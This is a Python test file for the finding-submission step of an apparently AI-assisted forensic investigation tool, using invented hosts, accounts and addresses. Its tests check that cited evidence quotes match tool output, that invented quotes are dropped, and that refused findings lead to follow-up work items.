"""The code side of a frontier item's submit (agent.frontier
.SubmitApplier). Invented fixtures only (CORP-WS01, CORP-WS02, jane.doe,
svc_kit.exe, 203.0.113.x, dates in 2031)."""
from __future__ import annotations

import json
import re
from types import SimpleNamespace

import pytest

from agent.frontier import SubmitApplier

_SERVE_PARTS = SubmitApplier._serve_parts
from core import incident_map as IM
from tests.core.test_incident_map import _case, _trace

_OUT = {
    11: "time,host,user,image\n2031-03-10 14:02:00,CORP-WS01,jane.doe,C:\\Users\\Public\\svc_kit.exe\n",
    12: "2031-03-10 13:58:00 logon from 203.0.113.7 user jane.doe\n",
}


class _Agent:
    """The run's per-call path, scripted: each record call pops a reply."""

    def __init__(self, replies):
        self.replies, self.records = list(replies), []

    def _call_once(self, name, args, **kw):
        self.records.append((name, args))
        return {"result": json.dumps(self.replies.pop(0)), "kind": "ran"}


@pytest.fixture
def env(tmp_path, monkeypatch):
    return _env(tmp_path, monkeypatch)


def _env(tmp_path, monkeypatch):
    case = _case(tmp_path)
    (case / ".atlas" / "investigation_tasks.json").write_text(json.dumps({"tasks": [
        {"id": "task-0001", "text": "What ran on CORP-WS01?", "status": "open",
         "parts": [{"id": "p1", "text": "what ran", "type": "list", "status": "open"}]}]}), encoding="utf-8")
    log = _trace(case, monkeypatch)
    # The scripted record path writes no beliefs: a named part takes every
    # finding here; the part gates' own tests write real beliefs.
    monkeypatch.setattr(SubmitApplier, "_serve_parts", lambda self, claim, parts: "")
    monkeypatch.setattr(IM.IncidentMap, "_entry",
                        staticmethod(lambda cid: {"type": "tool_call", "stdout_excerpt": _OUT[int(cid)]}
                                     if int(cid) in _OUT else None))
    return case, log, IM.open(case)


def _run(calls=(11, 12)):
    return SimpleNamespace(calls=list(calls))


def _item(log, origin="join_hit", host="CORP-WS01", task_ids=()):
    return log.add_work_item(origin, list(task_ids), "", {"host": host}, "w", source_ref={"host": host},
                             extra_key=f"{origin}:{host}:t")


_FINDING = {"statement": "svc_kit.exe ran as jane.doe on CORP-WS01 at 2031-03-10 14:02:00.", "host": "CORP-WS01",
            "confidence": "likely", "bears_on": ["task-0001/p1"],
            "basis": [{"call_id": 11, "quote": "jane.doe,C:\\Users\\Public\\svc_kit.exe"},
                      {"call_id": 12, "quote": "not in that output"}],
            "entities": [{"kind": "file", "value": "C:\\Users\\Public\\svc_kit.exe"},
                         {"kind": "account", "value": "jane.doe"}]}
_LABELS = [{"ref": {"kind": "file", "value": "C:\\Users\\Public\\svc_kit.exe"}, "label": "attacker",
            "basis": [{"call_id": 11, "quote": "svc_kit.exe"}]},
           {"ref": {"kind": "account", "value": "jane.doe"}, "label": "attacker",
            "attacker_from": "2031-03-10 14:02:00", "basis": [{"call_id": 11, "quote": "jane.doe"}]},
           {"ref": {"kind": "endpoint", "value": "203.0.113.7"}, "label": "attacker",
            "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7"}]}]


def test_a_finding_records_with_its_lineage_and_its_labels_as_typed_rows(env):
    case, log, m = env
    agent = _Agent([{"success": True, "claim_id": "C0001"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    assert ap({"findings": [_FINDING], "labels": _LABELS}, _run(), False) is None
    name, args = agent.records[0]
    assert name == "misc.record_finding" and args["input_call_ids"] == [11] and args["linked_call_id"] == 11
    assert args["confidence"] == "LIKELY" and "svc_kit.exe" in args["supporting_evidence"]
    assert args["indicators"] == [
        {"type": "path", "value": "C:\\Users\\Public\\svc_kit.exe", "side": "attacker"},
        {"type": "account", "value": "jane.doe", "side": "attacker", "attacker_from": "2031-03-10 14:02:00"}]
    assert any("not in call 12" in d for d in ap.out["dropped"])
    # the address no finding carries is a map proposal; the finding's
    # entities get no second label from this submit
    labelled = {e["value"] for e in m.attacker_entities(proposals=True)}
    assert labelled == {"203.0.113.7"} and ap.out["labels"] == 1 and ap.out["claims"] == ["C0001"]


def test_a_refused_finding_is_repaired_inside_the_item_and_its_event_follows(env):
    case, log, m = env
    agent = _Agent([{"success": False, "gate": "evidence_strength", "error": "cite the row"},
                    {"success": True, "claim_id": "C0002"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    event = {"host": "CORP-WS01", "time": "2031-03-10 14:02:00", "kind": "process", "verb": "ran",
             "object": {"kind": "file", "value": "C:\\Users\\Public\\svc_kit.exe"},
             "basis": [{"call_id": 11, "quote": "svc_kit.exe"}]}
    reply = ap({"findings": [_FINDING], "labels": _LABELS, "events": [event]}, _run(), False)
    assert "finding 1 refused (evidence_strength): cite the row" in reply and ap.out["events"] == 0
    assert ap({"findings": [_FINDING]}, _run(), False) is None
    assert ap.out["findings"] == 1 and ap.out["events"] == 1
    assert agent.records[1][1]["indicators"][0]["side"] == "attacker"   # the first submit's label stands


def test_a_finding_refused_twice_stays_out_its_labels_go_unknown_and_a_followup_opens(env):
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    agent = _Agent([refusal, refusal])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    assert ap({"findings": [_FINDING], "labels": _LABELS}, _run(), False)
    assert ap({"findings": [_FINDING]}, _run(), False) is None
    assert ap.out["findings"] == 0
    assert {e["value"] for e in m.attacker_entities(proposals=True)} == {"203.0.113.7"}
    follow = [i for i in log.work_items() if i["origin"] == "followup"]
    assert len(follow) == 1 and follow[0]["source_ref"]["gate"] == "evidence_strength"
    assert follow[0]["source_ref"]["call_ids"] == [11]


def test_the_item_end_counts_an_unrepaired_finding_as_refused_twice(env):
    case, log, m = env
    agent = _Agent([{"success": False, "gate": "g", "error": "e"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    assert ap({"findings": [_FINDING]}, _run(), False)
    ap.finish()
    assert [i["source_ref"]["gate"] for i in log.work_items() if i["origin"] == "followup"] == ["g"]


def test_a_host_pass_asks_once_for_its_arrival_and_keeps_an_examined_one(env):
    case, log, m = env
    ap = SubmitApplier(_Agent([]), case, m, _item(log, "host_pass", "CORP-WS02"), "host_pass")
    assert "arrival is required" in ap({}, _run(), False)
    ex = {"arrival": {"examined": {"call_ids": [12], "why": "the logon rows show no inbound session"}}}
    assert ap(ex, _run(), False) is None and ap.out["observations"] == 1 and ap.yielded()


def test_leads_pass_validate_read_and_targetless_proposals_drop(env, monkeypatch):
    case, log, m = env
    monkeypatch.setattr("core.question_plan.reading_tools", lambda: [("table.table_grep", "")])
    monkeypatch.setattr("core.question_plan.check_reads", lambda c, r, t: (
        ([{"tool": r["tool"], "target": {"host": r.get("host", ""), "pattern": r.get("pattern", "")},
           "why": r["why"]}], "") if r.get("tool") in t else ([], "not a reading tool")))
    ap = SubmitApplier(_Agent([]), case, m, _item(log, "synthesis", ""), "synthesis")
    ap({"proposals": [{"tool": "table.table_grep", "host": "CORP-WS02", "pattern": "svc_kit", "why": "spread?"},
                      {"tool": "table.table_grep", "host": "CORP-WS02", "why": "no target"},
                      {"tool": "x.y", "host": "CORP-WS02", "source": "a.csv", "why": "bad tool"}],
        "contradictions": [{"text": "two first logons", "host": "CORP-WS01"}]}, _run(), False)
    plans = [i for i in log.work_items() if i["origin"] == "plan"]
    assert len(plans) == 1 and plans[0]["target"]["pattern"] == "svc_kit"
    assert len(ap.out["dropped"]) == 2 and ap.out["proposals"] == 1
    assert [i["why"] for i in log.work_items() if i["origin"] == "followup"] == ["two first logons"]


def test_a_view_row_examined_limits_its_part_when_it_is_the_only_open_row(env, monkeypatch):
    case, log, m = env
    monkeypatch.setattr(m, "views", lambda open_only=False: [
        {"view_id": 3, "task_id": "task-0001", "part_id": "p1", "spec": {}, "rows": [
            {"row_key": "CORP-WS01", "status": "open"}, {"row_key": "CORP-WS02", "status": "filled"}]}])
    seen = []
    monkeypatch.setattr("core.investigation_tasks.update_task", lambda c, t, **kw: seen.append((t, kw)) or
                        {"success": True})
    item = log.add_work_item("view_row_opened", ["task-0001"], "", None, "row open",
                             source_ref={"kind": "view_row", "view_id": 3, "row_key": "CORP-WS01"})
    ap = SubmitApplier(_Agent([]), case, m, item, "view_row_opened")
    ap({"examined": {"call_ids": [11], "why": "the process rows of the host hold no such start"}}, _run(), False)
    assert seen == [("task-0001", {"parts": {"p1": {"limitation": {
        "basis": "examined", "reason": "the process rows of the host hold no such start", "call_ids": [11]}}}})]


def test_the_same_refusal_in_another_item_returns_the_same_followup(env):
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    for host in ("CORP-WS01", "CORP-WS02"):
        ap = SubmitApplier(_Agent([refusal, refusal]), case, m, _item(log, host=host), "join_hit")
        ap({"findings": [_FINDING]}, _run(), False)
        ap({"findings": [{**_FINDING, "statement": "  " + _FINDING["statement"].upper()}]}, _run(), False)
    assert len([i for i in log.work_items() if i["origin"] == "followup"]) == 1


def test_a_duplicate_finding_counts_as_no_new_finding(env):
    case, log, m = env
    agent = _Agent([{"success": True, "duplicate": True, "existing_call_id": 4}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    assert ap({"findings": [_FINDING]}, _run(), False) is None and ap.out["findings"] == 0


def test_a_refusal_followup_raises_no_new_one_for_its_own_gate(env):
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    item = log.add_work_item("followup", [], "", {"host": "CORP-WS01"}, "f",
                             source_ref={"kind": "refusal", "gate": "evidence_strength", "closed_by": "executor"},
                             extra_key="refusal:evidence_strength:x")
    ap = SubmitApplier(_Agent([refusal, refusal]), case, m, item, "followup")
    ap({"findings": [{**_FINDING, "statement": "A reworded claim about svc_kit.exe on CORP-WS01."}]}, _run(), False)
    ap({"findings": [{**_FINDING, "statement": "Yet another wording of it."}]}, _run(), False)
    ap.finish()                          # a reworded one is judged as new; both end refused twice here
    assert [i["call_id"] for i in log.work_items() if i["origin"] == "followup"] == [item["call_id"]]
    assert any("no new follow-up" in n for n in ap.out["notes"])


def test_an_event_on_a_recorded_attacker_entity_carries_that_findings_claim(env):
    case, log, m = env
    ap = SubmitApplier(_Agent([{"success": True, "claim_id": "C0007"}]), case, m, _item(log), "join_hit")
    on_it = {"host": "CORP-WS01", "time": "2031-03-10 14:02:00", "kind": "process", "verb": "ran",
             "object": {"kind": "file", "value": "C:\\Users\\Public\\svc_kit.exe"},
             "basis": [{"call_id": 11, "quote": "svc_kit.exe"}]}
    other = {"host": "CORP-WS01", "time": "2031-03-10 15:00:00", "kind": "logon",
             "actor": {"kind": "account", "value": "john.roe"}, "basis": [{"call_id": 12, "quote": "jane.doe"}]}
    ap({"findings": [_FINDING], "labels": _LABELS, "events": [on_it, other, dict(on_it)]}, _run(), False)
    with m._read() as con:
        rows = con.execute("SELECT e.verb, l.claim_id FROM events e LEFT JOIN labels l ON l.target = 'v:' || e.vid "
                           "AND l.current = 1 ORDER BY e.vid").fetchall()
    assert [(r["verb"], r["claim_id"]) for r in rows] == [("ran", "C0007"), ("", None)]
    assert ap.out["events"] == 2                                   # the repeat is the same event


def test_the_same_contradiction_from_two_syntheses_is_one_followup(env):
    case, log, m = env
    for n, text in enumerate(("Two first logons on CORP-WS01 at 14:00", "two first logons on  corp-ws01 at 15:00")):
        item = log.add_work_item("synthesis", [], "", None, "s", source_ref={"kind": "synthesis"},
                                 extra_key=f"synthesis:{n}")
        SubmitApplier(_Agent([]), case, m, item, "synthesis")({"contradictions": [{"text": text}]}, _run(), False)
    assert len([i for i in log.work_items() if i["origin"] == "followup"]) == 1


def test_a_refusal_whose_gate_text_moves_is_still_one_followup(env):
    case, log, m = env
    for host, err in (("CORP-WS01", "cite the row (3 values)"), ("CORP-WS02", "cite the row (4 values)")):
        refusal = {"success": False, "gate": "evidence_strength", "error": err}
        ap = SubmitApplier(_Agent([refusal, refusal]), case, m, _item(log, host=host), "join_hit")
        ap({"findings": [_FINDING]}, _run(), False)
        ap({"findings": [_FINDING]}, _run(), False)
    assert len([i for i in log.work_items() if i["origin"] == "followup"]) == 1


def test_a_quote_of_the_rendered_table_view_stands_and_maps_to_its_row(env, monkeypatch):
    case, log, m = env
    saved = json.dumps({"rows": [{"TimeCreated": "03/10/2031 13:58:00", "Computer": "CORP-WS01", "User": "jane.doe",
                                  "Image": "C:\\Users\\Public\\other.exe"},
                                 {"TimeCreated": "03/10/2031 14:02:00", "Computer": "CORP-WS01", "User": "jane.doe",
                                  "Image": "C:\\Users\\Public\\svc_kit.exe"}]})
    _OUT[21] = saved
    shown = ("table.table_grep: 2 rows\n#1 2031-03-10 13:58:00 | CORP-WS01 | jane.doe | C:\\Users\\Public\\other.exe\n"
             "#2 2031-03-10 14:02:00 | CORP-WS01 | jane.doe | \u2026Public\\svc_kit.exe\n[trace call id 21]")
    agent = _Agent([{"success": True, "claim_id": "C0009"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    finding = {**_FINDING, "basis": [{"call_id": 21, "quote": "#2 2031-03-10 14:02:00 | CORP-WS01 | jane.doe | "
                                                               "\u2026Public\\svc_kit.exe"},
                                     {"call_id": 21, "quote": "a line nobody was shown"}]}
    run = SimpleNamespace(calls=[21], seen={21: shown})
    assert ap({"findings": [finding]}, run, False) is None and ap.out["findings"] == 1
    assert agent.records[0][1]["input_call_ids"] == [21]
    assert any("a line nobody was shown" in d for d in ap.out["dropped"])
    from agent.frontier import _cells
    assert m.row_ref_for_cells(21, _cells(finding["basis"][0]["quote"])) == "21#R2"
    _OUT.pop(21)


def test_a_shown_quote_without_a_saved_row_or_from_an_atlas_note_is_dropped(env):
    case, log, m = env
    _OUT[22] = json.dumps({"rows": [{"User": "jane.doe", "Image": "C:\\Users\\Public\\svc_kit.exe"}]})
    shown = ("#1 jane.doe | C:\\Users\\Public\\svc_kit.exe\n#2 john.roe | C:\\Tools\\other.exe\n"
             "[map: svc_kit.exe was seen on CORP-WS02 before its start]\n\"note\": \"svc_kit.exe ran as john.roe\"")
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    run = SimpleNamespace(calls=[22], seen={22: shown})
    kept, _q = ap._basis([{"call_id": 22, "quote": "svc_kit.exe was seen on CORP-WS02 before its start"},
                          {"call_id": 22, "quote": "svc_kit.exe ran as john.roe"},
                          {"call_id": 22, "quote": "#2 john.roe | C:\\Tools\\other.exe"},
                          {"call_id": 22, "quote": "#1 jane.doe | C:\\Users\\Public\\svc_kit.exe"}], run)
    assert [k["quote"] for k in kept] == ["#1 jane.doe | C:\\Users\\Public\\svc_kit.exe"]
    assert kept[0]["row_ref"] == "22#R1" and len(ap.out["dropped"]) == 3
    _OUT.pop(22)


def test_a_quote_of_the_json_view_with_escaped_paths_or_the_common_cells_maps_to_a_row(env):
    case, log, m = env
    _OUT[23] = json.dumps({"rows": [{"Computer": "CORP-WS01", "User": "jane.doe",
                                     "Image": "C:\\Users\\Public\\svc_kit.exe"},
                                    {"Computer": "CORP-WS01", "User": "jane.doe", "Image": "C:\\Tools\\other.exe"}]})
    view = {"tool": "table.table_grep", "same_in_every_returned_row": {"Computer": "CORP-WS01", "User": "jane.doe"},
            "rows": ["#1 C:\\Users\\Public\\svc_kit.exe", "#2 C:\\Tools\\other.exe"]}
    shown = "{\n" + ",\n".join(json.dumps(k) + ": " + json.dumps(v) for k, v in view.items()) + "\n}"
    assert "C:\\\\Users" in shown                                  # the view escapes backslashes
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    run = SimpleNamespace(calls=[23], seen={23: shown})
    kept, _q = ap._basis([{"call_id": 23, "quote": "#1 C:\\Users\\Public\\svc_kit.exe"},            # unescaped
                          {"call_id": 23, "quote": "\"#2 C:\\\\Tools\\\\other.exe\""},             # as shown
                          {"call_id": 23, "quote": "\"Computer\": \"CORP-WS01\", \"User\": \"jane.doe\""},
                          {"call_id": 23, "quote": "\"Computer\": \"CORP-WS09\""}], run)
    assert [k["row_ref"] for k in kept] == ["23#R1", "23#R2", "23#R1"] and len(ap.out["dropped"]) == 1
    _OUT.pop(23)


def test_a_frontier_quote_of_an_echoed_search_pattern_is_no_basis(env, monkeypatch):
    case, log, m = env
    sentence = "the attacker staged the archive in a hidden folder"
    echo = {"type": "tool_call", "cmd": "<py>:strings_grep", "success": True,
            "args": json.dumps({"path": "exports/corp-ws01-notes.txt", "pattern": sentence}),
            "stdout_excerpt": f"searched exports/corp-ws01-notes.txt for '{sentence}'\n0 matches\n"}
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(lambda cid: echo if int(cid) == 40 else None))
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    run = SimpleNamespace(calls=[40], seen={40: echo["stdout_excerpt"] + "[trace call id 40]"})
    kept, _q = ap._basis([{"call_id": 40, "quote": sentence},
                          {"call_id": 40, "quote": f"for '{sentence}'"}], run)
    assert kept == [] and len(ap.out["dropped"]) == 2


def test_quotes_of_the_live_table_view_map_to_their_rows(env):
    from core.tool_result_view import render_rows_view
    case, log, m = env
    data = {"success": True, "rows": [
        {"TimeCreated": "2031-03-10 13:58:00", "Computer": "CORP-WS02", "User": "jane.doe",
         "Image": "C:\\Users\\Public\\svc_kit.exe", "EventID": 4624},
        {"TimeCreated": "2031-03-10 14:02:00", "Computer": "CORP-WS02", "User": "jane.doe",
         "Image": "C:\\Tools\\other.exe", "EventID": 4688}]}
    _OUT[24] = json.dumps(data)
    shown = render_rows_view(data, 12000, 24, tool="table_table_grep")[0]
    assert '"same_in_every_returned_row"' in shown and "#1 2031-03-10 13:58:00 |" in shown
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    kept, _q = ap._basis([
        {"call_id": 24, "quote": "2031-03-10 13:58:00 | C:\\Users\\Public\\svc_kit.exe | 4624"},   # no marker
        {"call_id": 24, "quote": "#2 2031-03-10 14:02:00 | C:\\Tools\\other.e..."},                # own clip
        {"call_id": 24, "quote": "same_in_every_returned_row: Computer CORP-WS02, User jane.doe"},
        {"call_id": 24, "quote": "same_in_every_returned_row: Computer CORP-WS09"},
        {"call_id": 24, "quote": "same in every returned row: jane.doe ran mimikatz from 203.0.113.7 as the attacker"}],
        SimpleNamespace(calls=[24], seen={24: shown}))
    assert [k["row_ref"] for k in kept] == ["24#R1", "24#R2", "24#R1"] and len(ap.out["dropped"]) == 2
    # the named line is kept as the shown line itself, never the model's words
    assert kept[2]["quote"] == '"same_in_every_returned_row": {"Computer": "CORP-WS02", "User": "jane.doe"}'
    assert not any("mimikatz" in k["quote"] for k in kept)
    _OUT.pop(24)


def test_a_finding_that_serves_nothing_is_kept_as_an_observation(env):
    case, log, m = env
    agent = _Agent([{"success": True, "claim_id": "C0011"}, {"success": True, "claim_id": "C0012"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    plain = {**_FINDING, "statement": "The host runs a backup agent.", "bears_on": [], "entities": []}
    wrong = {**plain, "bears_on": ["task-0099/p7", "nothing labelled"]}
    served = {**plain, "bears_on": ["task-0001/p1"]}
    reply = ap({"findings": [plain, wrong, served]}, _run(), False)
    # the two unserved findings share one statement: one observation (an upsert counts once)
    assert len(agent.records) == 1 and ap.out["findings"] == 1 and ap.out["observations"] == 1
    assert reply is None or "kept as an observation" in str(reply)
    # an attacker-side row of its own is enough
    ap2 = SubmitApplier(_Agent([{"success": True, "claim_id": "C0013"}]), case, m, _item(log, host="CORP-WS02"),
                        "join_hit")
    ap2({"findings": [{**plain, "entities": [{"kind": "endpoint", "value": "203.0.113.7"}]}],
         "labels": [_LABELS[2]]}, _run(), False)
    assert ap2.out["findings"] == 1


def test_a_partial_submit_records_and_the_item_goes_on(env):
    case, log, m = env
    agent = _Agent([{"success": True, "claim_id": "C0021"}, {"success": True, "claim_id": "C0022"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    reply = ap({"findings": [_FINDING], "partial": True}, _run(), False)
    assert "recorded: 1 new finding(s)" in reply and "submit without partial" in reply
    second = {**_FINDING, "statement": "svc_kit.exe ran again on CORP-WS01 at 2031-03-10 15:00:00."}
    assert ap({"findings": [second]}, _run(), False) is None and ap.out["findings"] == 2


def test_a_challenged_statement_is_not_evaluated_again_and_evidence_is_the_full_row(env):
    case, log, m = env
    challenged = {"success": False, "gate": "evidence_strength", "evaluate_verdict": "CHALLENGED",
                  "error": "VERDICT: CHALLENGED: the row shows the file, not its run"}
    agent = _Agent([challenged, challenged])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    strong = {**_FINDING, "confidence": "confirmed"}
    ap({"findings": [strong]}, _run(), False)
    ap({"findings": [strong]}, _run(), False)
    assert len(agent.records) == 1                                 # the repeat never reached the evaluator
    ((statement, tier),) = list(ap.challenged)
    assert (statement, tier) == (" ".join(strong["statement"].split()).casefold(), "CONFIRMED")
    assert len(ap.challenged[(statement, tier)]["rows"]) == 1
    # the evidence the checks and the evaluator read is the whole row
    assert agent.records[0][1]["supporting_evidence"].startswith(
        "[call 11] 2031-03-10 14:02:00,CORP-WS01,jane.doe,C:\\Users\\Public\\svc_kit.exe")


def test_a_challenged_statement_reaches_the_evaluator_again_only_with_a_row_it_has_not_judged(env):
    case, log, m = env
    challenged = {"success": False, "gate": "evidence_strength", "evaluate_verdict": "CHALLENGED",
                  "error": "VERDICT: CHALLENGED: the row shows the file, not its run"}
    agent = _Agent([challenged, {"success": True, "claim_id": "C0041"}])
    memory: dict = {}                                           # shared per run, as FrontierRun shares it

    def submit(finding, calls=(11, 12)):
        ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
        ap.challenged = memory
        ap({"findings": [finding]}, _run(calls), False)
        return ap
    strong = {**_FINDING, "confidence": "confirmed"}
    first, second = strong["basis"][0], {"call_id": 12, "quote": "logon from 203.0.113.7 user jane.doe"}
    submit({**strong, "basis": [first, second]})                # challenged on both rows
    for again in ({**strong, "basis": [second]}, {**strong, "basis": [second, first]}):
        ap = submit(again)                                      # a subset and a reshuffle: refused here
        assert len(agent.records) == 1 and ap.out["refused"][0]["gate"] == "challenged_before"
    _OUT[13] = "2031-03-10 14:03:00 svc_kit.exe started by jane.doe\n"
    ap = submit({**strong, "basis": [second, {"call_id": 13, "quote": "svc_kit.exe started by jane.doe"}]},
                (11, 12, 13))
    _OUT.pop(13)
    assert len(agent.records) == 2 and ap.out["claims"] == ["C0041"]   # a row not judged yet


def test_only_the_structured_verdict_marks_a_statement_challenged(env):
    case, log, m = env
    quoting = {"success": False, "gate": "citation", "error": "a CHALLENGED finding needs ... (gate text)"}
    ap = SubmitApplier(_Agent([quoting]), case, m, _item(log), "join_hit")
    ap({"findings": [_FINDING]}, _run(), False)
    assert ap.challenged == {}


def test_the_evidence_is_fit_to_its_share_with_quotes_and_a_count(env, monkeypatch):
    case, log, m = env
    monkeypatch.setattr("agent.frontier._evaluator_chars", lambda: 440)      # room: 110 characters
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    monkeypatch.setattr(ap, "_full_row", lambda b: "x" * 80)
    text = ap._evidence([{"call_id": 11, "quote": "q1"}, {"call_id": 11, "quote": "q2"},
                         {"call_id": 12, "quote": "q3" * 60}])
    assert text.splitlines() == ["[call 11] " + "x" * 80, "[call 11] q2", "(1 more row(s) cited)"]


class _GraphAgent(_Agent):
    """The record path writing a real belief for each recorded finding."""

    def _call_once(self, name, args, **kw):
        from core.claim_graph import add_claim
        self.records.append((name, args))
        r = add_claim(self.case, args["description"], host=args.get("host") or "", enforce_validation=False)
        cid = next(str(v) for k, v in r.items() if k in ("id", "claim_id", "node_id") and v)
        return {"result": json.dumps({"success": True, "claim_id": cid}), "kind": "ran"}


def test_a_named_part_or_attacker_value_must_hold_the_finding(env, monkeypatch):
    from core.claim_graph import get_node, load_graph
    case, log, m = env
    monkeypatch.setattr(SubmitApplier, "_serve_parts", _SERVE_PARTS)
    agent = _GraphAgent([])
    agent.case = case
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    m.label(f"e:{m.upsert_entity('endpoint', '203.0.113.7')}", "attacker", [{"call_id": 12, "quote": "203.0.113.7"}])
    plain = {**_FINDING, "statement": "The host runs a backup agent.", "entities": []}
    gap = {**plain, "statement": "It could not be determined what ran.", "bears_on": ["task-0001/p1"]}
    foreign = {**plain, "bears_on": ["203.0.113.7"]}
    assert ap({"findings": [gap, foreign]}, _run(), False) is None
    assert ap.out["findings"] == 0 and ap.out["observations"] == 2
    withdrawn = [n for n in load_graph(case)["nodes"].values() if n.get("status") == "withdrawn"]
    assert len(withdrawn) == 1 and "kept as an observation" in withdrawn[0]["withdraw_reason"]
    served = {**plain, "statement": "svc_kit.exe ran on CORP-WS01.", "bears_on": ["task-0001/p1"]}
    assert ap({"findings": [served]}, _run(), False) is None and ap.out["findings"] == 1
    from core.investigation_tasks import load_tasks
    part = load_tasks(case)["tasks"][0]["parts"][0]
    assert part["status"] == "answered" and get_node(load_graph(case), part["claim_ids"][0])
    obs = m.observations()
    assert obs and obs[0]["quotes"] == ["jane.doe,C:\\Users\\Public\\svc_kit.exe"]



def test_a_reworded_claim_on_rows_already_cited_is_no_new_effect(env):
    case, log, m = env
    agent = _Agent([{"success": True, "claim_id": "C0031"}, {"success": True, "claim_id": "C0032"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    reworded = {**_FINDING, "statement": "jane.doe started svc_kit.exe on CORP-WS01 at 2031-03-10 14:02:00."}
    assert ap({"findings": [_FINDING, reworded]}, _run(), False) is None
    assert ap.out["claims"] == ["C0031", "C0032"]
    assert [e for e in ap.effects if e[0] == "claim"] == [("claim", "C0031")]


def test_a_bare_question_id_or_an_answered_part_takes_only_a_finding_that_answers_it(env, monkeypatch):
    from core.investigation_tasks import load_tasks, save_tasks
    case, log, m = env
    monkeypatch.setattr(SubmitApplier, "_serve_parts", _SERVE_PARTS)
    agent = _GraphAgent([])
    agent.case = case
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    served = {**_FINDING, "statement": "svc_kit.exe ran on CORP-WS01.", "entities": [], "bears_on": ["task-0001/p1"]}
    assert ap({"findings": [served]}, _run(), False) is None and ap.out["findings"] == 1
    assert load_tasks(case)["tasks"][0]["parts"][0]["status"] == "answered"
    plain = {**_FINDING, "statement": "The host runs a backup agent.", "entities": []}
    # A question id names no part. It is sent back once with the question's parts; the
    # part named for a row that answers it still goes through the part's own test.
    reply = ap({"findings": [{**plain, "bears_on": ["task-0001"]},
                             {**plain, "statement": "The host keeps a backup agent.", "bears_on": ["task-0001/p1"]}]},
               _run(), False)
    assert "refused (bears_on_question_id)" in reply and "task-0001/p1 (what ran)" in reply
    assert "A row that answers none stays an observation, which is a result" in reply
    assert ap.out["findings"] == 1 and ap.out["observations"] == 1
    assert ap({"findings": [{**plain, "bears_on": ["task-0001"]}]}, _run(), False) is None   # again: an observation
    assert ap.out["findings"] == 1 and ap.out["observations"] == 2
    again = {**served, "statement": "cmd.exe ran on CORP-WS01.", "bears_on": ["task-0001"]}
    assert "refused (bears_on_question_id)" in ap({"findings": [again]}, _run(), False)
    assert ap({"findings": [{**again, "bears_on": ["task-0001/p1"]}]}, _run(), False) is None   # named: it serves
    assert ap.out["findings"] == 2


def test_the_evidence_fits_the_evaluators_window_with_the_statement_counted(env, monkeypatch):
    from agent import frontier as F
    from core.model_context import derived_context_chars
    monkeypatch.setenv("ATLAS_MODEL_CONTEXT_TOKENS", "8192")
    assert F._evaluator_chars() == derived_context_chars(8192)
    case, log, m = env
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    monkeypatch.setattr(F, "_evaluator_chars", lambda: 440)
    monkeypatch.setattr(ap, "_full_row", lambda b: "x" * 80)
    basis = [{"call_id": 11, "quote": "q1"}]
    assert ap._evidence(basis).startswith("[call 11] xxx")
    assert ap._evidence(basis, "s" * 30) == "[call 11] q1"           # the statement takes its share too



def test_a_forced_submits_refused_finding_is_repaired_in_the_item_and_raises_no_followup(env):
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    agent = _Agent([refusal, {"success": True, "claim_id": "C0040"}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    reply = ap({"findings": [_FINDING], "labels": _LABELS}, _run(), True)       # the forced, final submit
    assert reply and "refused (evidence_strength)" in reply and ap.pending
    assert ap({"findings": [_FINDING]}, _run(), True) is None                    # the repair round's submit
    ap.finish()
    assert ap.out["findings"] == 1 and not [i for i in log.work_items() if i["origin"] == "followup"]


def test_a_repair_refused_again_is_refused_twice_with_one_followup(env):
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    ap = SubmitApplier(_Agent([refusal, refusal]), case, m, _item(log), "join_hit")
    assert ap({"findings": [_FINDING]}, _run(), True)
    ap({"findings": [_FINDING]}, _run(), True)
    ap.finish()
    assert [i["source_ref"]["gate"] for i in log.work_items() if i["origin"] == "followup"] == ["evidence_strength"]


def test_a_forced_host_pass_without_an_arrival_is_not_asked_and_records_it_missing(env):
    case, log, m = env
    ap = SubmitApplier(_Agent([]), case, m, _item(log, "host_pass", "CORP-WS02"), "host_pass")
    assert ap({"findings": []}, _run(), True) is None                            # no arrival ask on a final submit
    assert ap.out.get("arrival_missing") is True



def test_a_question_id_left_unrepaired_when_the_item_ends_is_an_observation_not_a_followup(env):
    case, log, m = env
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    plain = {**_FINDING, "statement": "The host runs a backup agent.", "entities": [], "bears_on": ["task-0001"]}
    assert ap({"findings": [plain]}, _run(), True)                     # a forced submit: its repair round follows
    ap.finish()                                                        # the item ended without the resubmit
    assert ap.out["observations"] == 1 and not [i for i in log.work_items() if i["origin"] == "followup"]


def test_a_record_refusal_after_a_question_id_repair_still_gets_its_own_repair(env):
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
